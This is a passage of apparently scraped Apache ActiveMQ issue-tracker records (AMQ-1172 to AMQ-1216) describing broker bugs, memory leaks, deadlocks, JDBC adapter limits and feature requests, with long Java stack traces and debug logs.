The RegionBroker contains the following logic, which overwrites the JMSTimestamp.   FWIU, the message timestamp should be set once at send and never changed by the broker.        if (message.getTimestamp() > 0 && (message.getBrokerPath() == null || message.getBrokerPath().length == 0)) {             //timestamp not been disabled and has not passed through a network            message.setTimestamp(System.currentTimeMillis());        }Attached is a simple test case and patch that changes the ">" in the if statement above to "<=".  I"m not sure if that is the proper fix, but it did make my problem go away.
issueID:AMQ-1172
type:Bug
changed files:TopicSubscription.java
TransportConnection.java
ConnectionView.java
Connection.java
ConnectionStatistics.java
PrefetchSubscription.java
texts:UsageManager leak when topic consumers are disconnected.
The usage on the usage manager associated with a topic will have a usage leak without the corresponding memory leak if consumer connections continually connection and disconnect.
issueID:AMQ-1173
type:Bug
changed files:MulticastDiscoveryAgent.java
texts:MulticastDiscoveryAgent heart beast may stop of machine clock jumps around.
Surprisingly, many high end machines now days have a hard time keeping a consistent clock.  The clocks may run fast and user tend to use a periodic cron job to sync the time on the local machine to the correct time.  When this happens the time looks like it went backwards and this was delaying the sending of Mutlicast heartbeats.
issueID:AMQ-1176
type:New Feature
changed files:
texts:Using temporary destination across a nework of broker not reliable.
Using temporary destinations across a network of broker can lead to some message not getting delivered due to the way that a temporary destination must first exist on a broker before it accepts a message for it.  Due to the timing of some network events, the message may get sent to the destination slightly ahead of the event that creates the temporary destination.
issueID:AMQ-1177
type:Bug
changed files:ActiveMQConnectionFactory.java
ActiveMQConnection.java
texts:ActiveMQConnection memory leaks
klas eriksson: Commented on AMQ-847 I think this issue is actually two (or more memory leaks.One in createConnection() and one in close().I tried a very similar program with the following results:apache-activemq-4.2-incubator-20061204.023752-14:1. "createConnection" followed by "close" when activeMq-server is UP:outOfmemory after ~1800 createConnection-close.2. "createConnection" without close when activeMq server is not started.outOfmemory after < 1800 failed "createConnection".I have also tried 4.0.x and 4.1.x. The leak memory too.
issueID:AMQ-1178
type:Bug
changed files:ConnectionPool.java
texts:Connection leak in the PooledConnectionFactory
The connection pool actually kept creating connections instead of pooling them!  Opps.
issueID:AMQ-1179
type:Bug
changed files:TopicSubscription.java
Topic.java
Queue.java
TransportConnection.java
UsageManager.java
ConnectionContext.java
texts:Broker Connection Shutdown is prone to lockup/deadlock
There are several scenarios (timing related) where the broker does not properly shutdown it"s connections to a client.
issueID:AMQ-1181
type:Improvement
changed files:Topic.java
Queue.java
TransportConnection.java
ConnectionContext.java
texts:Avoid Network Deadlocks if possible
When you depend on the brokers to flow control your producers, the brokers are usually running with usage managers at 100%.  Now if use this in network of brokers configuration it is very easy to get into a scenario where the brokers network bridges lock messages to send to the next broker but bock on the send and thus create a network deadlock.
issueID:AMQ-1188
type:Bug
changed files:TcpTransportServer.java
texts:Illegal character in hostname error on hosts with underscores in their host names
On a machine where the hostname contains underscores (e.g. HS_RH64_A3_1) ActiveMQ fails to initialize with the stack trace below. This seems to be a problem with the TCP protocol handler since doing new URL("http://HS_RH64_A3_1.godzilla.local:61616") works fine.2007-03-05 08:30:20,076 &#91;WrapperSimpleAppMain&#93; ERROR (BrokerService.java:412) - Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: Transport Connector could not be registered in JMX: Illegal character in hostname at index 8: tcp://HS_RH64_A3_1.godzilla.local:61616java.io.IOException: Transport Connector could not be registered in JMX: Illegal character in hostname at index 8: tcp://HS_RH64_A3_1.godzilla.local:61616        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:25)        at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1079)        at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:1508)        at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1468)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:402)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:47)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1062)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1029)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:420)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:245)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:141)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:242)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:156)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:290)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:348)        at org.apache.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:161)        at org.apache.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:51)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:41)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:57)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:82)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:47)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:50)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:82)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:50)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:46)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.activemq.console.Main.runTaskClass(Main.java:159)        at org.apache.activemq.console.Main.main(Main.java:91)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:197)        at java.lang.Thread.run(Thread.java:595)Caused by: java.io.IOException: Illegal character in hostname at index 8: tcp://HS_RH64_A3_1.godzilla.local:61616        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:43)        at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:94)        at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:56)        at org.apache.activemq.transport.TransportFactory.bind(TransportFactory.java:109)        at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:270)        at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:122)        at org.apache.activemq.broker.TransportConnector.asManagedConnector(TransportConnector.java:100)        at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1072)        ... 35 moreCaused by: java.net.URISyntaxException: Illegal character in hostname at index 8: tcp://HS_RH64_A3_1.godzilla.local:61616        at java.net.URI$Parser.fail(URI.java:2816)        at java.net.URI$Parser.parseHostname(URI.java:3355)        at java.net.URI$Parser.parseServer(URI.java:3204)        at java.net.URI$Parser.parseAuthority(URI.java:3123)        at java.net.URI$Parser.parseHierarchical(URI.java:3065)        at java.net.URI$Parser.parse(URI.java:3021)        at java.net.URI.<init>(URI.java:663)        at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:91)        ... 41 more
issueID:AMQ-1189
type:Bug
changed files:TransportConnection.java
texts:java.lang.ClassCastException: org.apache.activemq.ActiveMQConnectionConsumer, when trying to publish to a topic
When publishing to a topic, a ClassCastException occurs:Caused by: java.lang.ClassCastException: org.apache.activemq.ActiveMQConnectionConsumer at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:810) at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:769) at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:360) at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:83) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:51) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:417) at org.apache.activemq.broker.region.Topic.send(Topic.java:264) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:292) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:385) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:193) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:98) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:136) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:497) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:604) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:293) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:95) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65) at org.apache.activemq.transport.vm.VMTransport.syncOneWay(VMTransport.java:96) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:83) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:47) at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:69) at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:74) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1175) ... 7 moreThe problem seems to stem in the processDispatch() method of the org.apache.activemq.broker.TransportConnection class.  Specifically, it happens during the line:Runnable sub=(Runnable) md.getConsumer();It doesn"t appear that ActiveMQConnectionConsumer implements the Runnable interface, so this is why the ClassCastException occurs.
issueID:AMQ-1191
type:Improvement
changed files:DefaultDatabaseLocker.java
DefaultJDBCAdapter.java
texts:JDBC based Master/Slave not supported for TransactSQL based databases (SQL Server and Sybase)
The main issue is figuring out the exclusive lock SQL syntax. I think the following is valid...SELECT * FROM TABLE WITH XLOCK
issueID:AMQ-1193
type:Improvement
changed files:DB2JDBCAdapter.java
texts:JDBC master slave support for DB2
None
issueID:AMQ-1194
type:New Feature
changed files:
texts:host the Web Console in the broker when running the &#39;activemq&#39; script
Though let folks easily disable it via the activemq.xml
issueID:AMQ-1196
type:New Feature
changed files:MessagePull.java
texts:allow consumers to pull messages by ID or by correlationID
and add methods on consumer likereceiveById(String id);receiveByCorrelationID(id)with nowait/timeout versions
issueID:AMQ-1197
type:Improvement
changed files:browse.jsp
DestinationFacade.java
dispatcher-servlet.xml
BrokerFacade.java
BrokerFacadeSupport.java
DeleteMessage.java
texts:delete message not supported for web console
None
issueID:AMQ-1199
type:New Feature
changed files:
texts:provide a new simple API so end users can view available destinations and query them to find their statistics (such as queue depth etc)
From the dev list..On 3/9/07, Dhawan, Vikram (LNG-DAY) <vikram.dhawan@lexisnexis.com> wrote:> Hi,> Is there a direct way using OpenWire Client API to get the number of> consumers attached to a Queue at a given point of time? I know it can be> done using JMX API but I was wondering if it can be done using Open Wire> client api.4.2 has a command agent...http://activemq.apache.org/command-agent.htmlwhich can be used for sending simple text commands to the broker and getting replies - such as to enquire about queue depths and the like.There"s also advisory messages...so you can listen to the operation of the broker, seeing new destinations, consumers, producers etc.However we"ve never yet wrapped up a little easy API folks can use on the client to easily view the available destinations and get their stats etc.Something like the following...Collection<ActiveMQQueue> connection.findQueues()Collection<ActiveMQTopic> connection.findTopics()// look up stats like queue depth etcDestinationStats getDestinationStatistics(ActiveMQDestination);
issueID:AMQ-1200
type:Bug
changed files:
texts:XA fails to start when JCA rar re-establishes connectivity with an external broker (tcp transport).
Hi,Here"s the scenario:I recently (ie, a couple days ago) downloaded and built the 4.1 branch, set up JBoss 4.0.5.GA with a slightly modified activemq-ra.rar (ra.xml modified to communicate with an external instance of the broker via tcp and setting UseInboundSession to true...not sure what this does really, but I tried it as false and the same behavior happens).Via a persistent queue (oracle 10 backing), I"m consuming messages in an MDB via the JCA message datasource using XA.Here"s the problem I"m seeing: if I shut down the JMS server, I see the appropriate EOF exception and subsequent reconnection attempts by the rar in JBoss. When I startup the external activemq broker again, the connection appears to get reestablished and work is accepted, started, and completed...EXCEPT there"s no mention of XA and thus the message is never actually accepted and consumed.Here"s some debug output from the JCA:PRE shutdown of external broker:2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; ServerSession requested.2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; Using idle session: ServerSessionImpl:12007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Starting run.2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work accepted: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work started: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Running2007-03-09 11:43:02,883 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; run loop start2007-03-09 11:43:02,884 DEBUG &#91;org.apache.activemq.TransactionContext&#93; Start: XidImpl&#91;FormatId=257, GlobalId=node118/114, BranchQual=1, localId=114&#93;2007-03-09 11:43:02,884 DEBUG &#91;org.apache.activemq.TransactionContext&#93; Started XA transaction: XID:257:6e6f64653131382f313134:31 snip - output of a resulting consumption of message2007-03-09 11:43:04,447 DEBUG &#91;org.apache.activemq.TransactionContext&#93; End: XidImpl&#91;FormatId=257, GlobalId=node118/114, BranchQual=1, localId=114&#93;2007-03-09 11:43:04,447 DEBUG &#91;org.apache.activemq.TransactionContext&#93; Ended XA transaction: XID:257:6e6f64653131382f313134:312007-03-09 11:43:04,448 DEBUG &#91;org.apache.activemq.TransactionContext&#93; Prepare: XidImpl&#91;FormatId=257, GlobalId=node118/114, BranchQual=1, localId=114&#93;2007-03-09 11:43:04,454 DEBUG &#91;org.apache.activemq.TransactionContext&#93; Commit: XidImpl&#91;FormatId=257, GlobalId=node118/114, BranchQual=1, localId=114&#93;2007-03-09 11:43:05,150 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; run loop end2007-03-09 11:43:05,178 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; Session returned to pool: ServerSessionImpl:12007-03-09 11:43:05,178 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Run finished2007-03-09 11:43:05,178 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work completed: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;POST shutdown and restart of external broker2007-03-09 11:46:33,077 DEBUG &#91;org.apache.activemq.transport.WireFormatNegotiator&#93; Sending: WireFormatInfo { version=2, properties={TightEncodingEnabled=true, CacheSize=1024, TcpNoDelayEnabled=true, SizePrefixDisabled=false, StackTraceEnabled=true, MaxInactivityDuration=30000, CacheEnabled=true}, magic=&#91;A,c,t,i,v,e,M,Q&#93;}2007-03-09 11:46:33,126 DEBUG &#91;org.apache.activemq.transport.WireFormatNegotiator&#93; Received WireFormat: WireFormatInfo { version=2, properties={TightEncodingEnabled=true, CacheSize=1024, TcpNoDelayEnabled=true, SizePrefixDisabled=false, StackTraceEnabled=true, MaxInactivityDuration=30000, CacheEnabled=true}, magic=&#91;A,c,t,i,v,e,M,Q&#93;}2007-03-09 11:46:33,126 DEBUG &#91;org.apache.activemq.transport.WireFormatNegotiator&#93; tcp://seqlims.broad.mit.edu/18.103.10.168:61616 before negotiation: OpenWireFormat{version=2, cacheEnabled=false, stackTraceEnabled=false, tightEncodingEnabled=false, sizePrefixDisabled=false}2007-03-09 11:46:33,126 DEBUG &#91;org.apache.activemq.transport.WireFormatNegotiator&#93; tcp://seqlims.broad.mit.edu/18.103.10.168:61616 after negotiation: OpenWireFormat{version=2, cacheEnabled=true, stackTraceEnabled=true, tightEncodingEnabled=true, sizePrefixDisabled=false}2007-03-09 11:53:15,196 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; ServerSession requested.2007-03-09 11:53:15,196 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; Using idle session: ServerSessionImpl:12007-03-09 11:53:15,196 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Starting run.2007-03-09 11:53:15,196 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work accepted: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;2007-03-09 11:53:15,196 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work started: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;2007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Running as you can see, no XA here2007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; run loop start2007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; run loop end2007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionPoolImpl&#93; Session returned to pool: ServerSessionImpl:12007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Run finished2007-03-09 11:53:15,197 DEBUG &#91;org.apache.activemq.ra.ServerSessionImpl:1&#93; Work completed: javax.resource.spi.work.WorkEvent&#91;source=org.jboss.resource.work.JBossWorkManager@1461b5b&#93;Thanks for your help!John
issueID:AMQ-1202
type:Bug
changed files:
texts:4.2 Broker memory leak wrt network connectors
If the NetworkConnector list contains any entries to unavailable / unreachable targets, memory is leaked.Tested with a broker having fairly "stock" settings, and with the following NetworkConnector section:    <networkConnectors>      <networkConnector uri="static://(tcp://dummy:5111?connectionTimeout=5000)" prefetchSize="10000"/>    </networkConnectors>I am using JDK 1.6, since that version of jmap allows the "-histo:live" switch, producing a list of the live objects.Just after starting the Broker, here is the top 10 entries from jmap:num   #instances    #bytes  class name--------------------------------------  1:     36639     4143792  <constMethodKlass>  2:     36639     2935200  <methodKlass>  3:     54423     2326752  <symbolKlass>  4:      8099     2008984  [B  5:      3451     1771816  <constantPoolKlass>  6:      3451     1433032  <instanceKlassKlass>  7:     14220     1212160  [C  8:      2894     1089840  <constantPoolCacheKlass>  9:         8      524352  [Lorg.apache.activemq.command.DataStructure;And then after about 5 minutes or so, here"s the jmap top 10:num   #instances    #bytes  class name--------------------------------------  1:       198    12977712  [Lorg.apache.activemq.command.DataStructure;  2:     36647     4144520  <constMethodKlass>  3:     36647     2935840  <methodKlass>  4:     54427     2326960  <symbolKlass>  5:      8293     2207032  [B  6:      3455     1773488  <constantPoolKlass>  7:      3455     1434376  <instanceKlassKlass>  8:     14499     1234040  [C  9:      2898     1091120  <constantPoolCacheKlass> 10:     17754      426096  java.lang.StringNot sure what component down the list is holding onto DataStructure, but I"ve included the full jmap output files.
issueID:AMQ-1204
type:Improvement
changed files:SybaseJDBCAdapter.java
texts:JDBC Master Slave does not work on Sybase version 12.x
None
issueID:AMQ-1206
type:New Feature
changed files:
texts:allow a broker to be configured using a properties file
So running the broker viaactivemq properties:foo.propertiesOr using the BrokerFactory using Java code
issueID:AMQ-1207
type:Sub-task
changed files:AdvisorySupport.java
AbstractDeadLetterStrategy.java
DeadLetterStrategy.java
StubBroker.java
MutableBrokerFilter.java
RegionBroker.java
SharedDeadLetterStrategy.java
TopicSubscription.java
TempQueueRegion.java
AdvisoryBroker.java
DestinationFactoryImpl.java
Topic.java
Queue.java
Broker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
AbstractRegion.java
PrefetchSubscription.java
IndividualDeadLetterStrategy.java
texts:Expired Message Listener
ActiveMQ 3.2.1 had expired message listeners where if a message from Destination1 is expired (after timeToLive) the message could be configured to be sent to org.activemq.deadletter.Destination1 automatically. We were using this feature in AMQ3.2.1 to identify expired messages and execute some logic when messages are expired.However this feature is not available in AMQ4.1/AMQ4.1.1. This needs to be fixed as well along with expiring messages properly in the code.Is it possible to give a high priority to this fix and fix it in code on an expedited basis? AMQ is being used in our product and major insurance companies are using the product. It is definitly going to give high visibility to ActiveMQ if we continued to use AMQ. Refactoring the code to not use AMQ is our option if this issue is not going to be resolved which we are wanting to avoid by all means.We would appreciate a Date for the resolution to this issue.
issueID:AMQ-1208
type:New Feature
changed files:
texts:XStream message transformer that works in both directions
Enhanced transformer that could be configured to work in both directions. It contains "reverse" property, which is false by default. In this case it works exactly as it is working now. In case that it is true, it changes direction of transformation ... producer transforms from text to object messages and consumers transforms form object to text ... I needed it for use with the Rest API in order to intercept and transform messages submitted through POST method.
issueID:AMQ-1216
type:Bug
changed files:OracleJDBCAdapter.java
texts:oracle jdbc adapter has issues storing messages greater than 64k
<bean id="oracle-ds" class="org.apache.commons.dbcp.BasicDataSource"destroy-method="close">   <property name="driverClassName"value="oracle.jdbc.driver.OracleDriver"/>   <property name="url" value="jdbc:oracle:thin:@dev.abc.com:1521:dev10g"/>   <property name="username" value="abc"/>   <property name="password" value="abc"/>   <property name="poolPreparedStatements" value="true"/> </bean>org.springframework.jms.UncategorizedJmsException: Uncategorized exceptionoccured during JMS processing; nested exception is javax.jms.JMSException:Failed to broker message: ID:abc2-2257-1175204828244-0:8:1:1:1 in container:java.sql.SQLException: Data size bigger than max size for this type: 63268Caused by:javax.jms.JMSException: Failed to broker message:ID:abc2-2257-1175204828244-0:8:1:1:1 in container: java.sql.SQLException:Data size bigger than max size for this type: 63268       atorg.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:46)       atorg.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1177)       at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1548)       atorg.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:465)       atorg.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:356)       at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:537)       at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:513)       at org.springframework.jms.core.JmsTemplate$2.doInJms(JmsTemplate.java:479)       at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:430)       at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:477)       at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:469)       atcom.abc.jump.jdm.service.jms.AsynchronousTaskManagerImpl.createDeploymentTasks(AsynchronousTaskManagerImpl.java:67)       atcom.abc.jump.process.view.plan.wizard.DeploymentTasksWizard.createDeploymentTasksAsynchronously(DeploymentTasksWizard.java:465)       atcom.abc.jump.process.view.plan.wizard.DeploymentTasksWizard.onFinish(DeploymentTasksWizard.java:424)       atcom.abc.jump.process.view.wizard.WizardScreen.onNavigation(WizardScreen.java:504)       at echopoint.WizardPane.fireOnNavigation(WizardPane.java:416)       at echopoint.WizardPane.actionPerformed(WizardPane.java:292)       at nextapp.echo.AbstractButton.fireActionPerformed(AbstractButton.java:256)       atnextapp.echo.AbstractButton$EventForwarder.actionPerformed(AbstractButton.java:135)       atnextapp.echo.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:98)       at nextapp.echo.DefaultButtonModel.doAction(DefaultButtonModel.java:87)       at nextapp.echo.AbstractButton.doAction(AbstractButton.java:245)       atnextapp.echoservlet.ui.AbstractButtonUI.clientAction(AbstractButtonUI.java:86)       at echopoint.ui.PushButtonUI.clientAction(PushButtonUI.java:86)       atnextapp.echoservlet.ControllerInputProcessor.doAction(ControllerInputProcessor.java:157)       atnextapp.echoservlet.ControllerInputProcessor.<init>(ControllerInputProcessor.java:126)       atnextapp.echoservlet.ControllerInputProcessor.process(ControllerInputProcessor.java:54)       at nextapp.echoservlet.Controller.service(Controller.java:609)       at nextapp.echoservlet.Connection.process(Connection.java:459)       at nextapp.echoservlet.EchoServer.process(EchoServer.java:314)       at com.abc.jump.process.view.PortalServlet.process(PortalServlet.java:162)       at nextapp.echoservlet.EchoServer.doPost(EchoServer.java:234)       at javax.servlet.http.HttpServlet.service(HttpServlet.java:709)       at javax.servlet.http.HttpServlet.service(HttpServlet.java:802)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:252)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atcom.abc.jump.process.view.web.filter.TemporaryAssetContentIntegrationFilter.doFilter(TemporaryAssetContentIntegrationFilter.java:76)       atorg.acegisecurity.util.FilterToBeanProxy.doFilter(FilterToBeanProxy.java:90)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:202)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atcom.abc.common.view.util.ThreadLocalResourceFilter.doFilter(ThreadLocalResourceFilter.java:58)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:202)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atorg.springframework.orm.hibernate3.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:174)       atorg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:77)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:202)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atcom.abc.common.util.filter.AuditUserDetailsFilter.doFilter(AuditUserDetailsFilter.java:64)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:202)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atorg.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:195)       atorg.acegisecurity.util.FilterToBeanProxy.doFilter(FilterToBeanProxy.java:90)       atorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:202)       atorg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:173)       atorg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:213)       atorg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:178)       atorg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:126)       atorg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:105)       atorg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:107)       atorg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:148)       atorg.apache.coyote.http11.Http11Processor.process(Http11Processor.java:869)       atorg.apache.coyote.http11.Http11BaseProtocol$Http11ConnectionHandler.processConnection(Http11BaseProtocol.java:664)       atorg.apache.tomcat.util.net.PoolTcpEndpoint.processSocket(PoolTcpEndpoint.java:527)       atorg.apache.tomcat.util.net.LeaderFollowerWorkerThread.runIt(LeaderFollowerWorkerThread.java:80)       atorg.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run(ThreadPool.java:684)       at java.lang.Thread.run(Thread.java:595)Caused by: java.io.IOException: Failed to broker message:ID:abc2-2257-1175204828244-0:8:1:1:1 in container: java.sql.SQLException:Data size bigger than max size for this type: 63268       atorg.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:31)       atorg.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:74)       atorg.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:224)       atorg.apache.activemq.store.memory.MemoryTransactionStore$1.addMessage(MemoryTransactionStore.java:117)       at org.apache.activemq.broker.region.Queue.send(Queue.java:345)       atorg.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:305)       atorg.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:378)       atorg.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:197)       at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)       atorg.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:98)       atorg.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:136)       atorg.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:449)       atorg.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:604)       atorg.apache.activemq.broker.TransportConnection.service(TransportConnection.java:258)       atorg.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:164)       atorg.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65)       atorg.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133)       atorg.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)       atorg.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)       atorg.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)       ... 1 moreCaused by: java.sql.SQLException: Data size bigger than max size 